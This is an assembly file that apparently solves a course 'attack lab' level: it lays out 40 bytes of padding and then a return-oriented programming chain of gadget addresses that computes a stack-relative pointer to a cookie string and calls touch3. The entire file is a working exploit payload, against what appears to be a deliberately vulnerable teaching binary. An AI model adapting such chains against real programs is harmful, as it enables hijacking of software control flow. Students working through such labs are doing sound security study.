stack:
  .ascii "0123456789012345678901234567890123456789"

  .quad 0x401a06  /* movq %rsp, %rax */
rsp_base:
  .quad 0x4019a2  /* movq %rax, %rdi */
  .quad 0x4019ab  /* popq %rax */
  .quad (cookie - rsp_base)  /* offset from rsp_base to cookie */
  .quad 0x4019dd  /* movl %eax, %edx */
  .quad 0x401a34  /* movl %edx, %ecx */
  .quad 0x401a13  /* movl %ecx, %esi */
  .quad 0x4019d6  /* callq <add_xy> */
  .quad 0x4019a2  /* movq %rax, %rdi */
  .quad 0x4018fa  /* callq <touch3> */

cookie:
  .asciz "59b997fa"
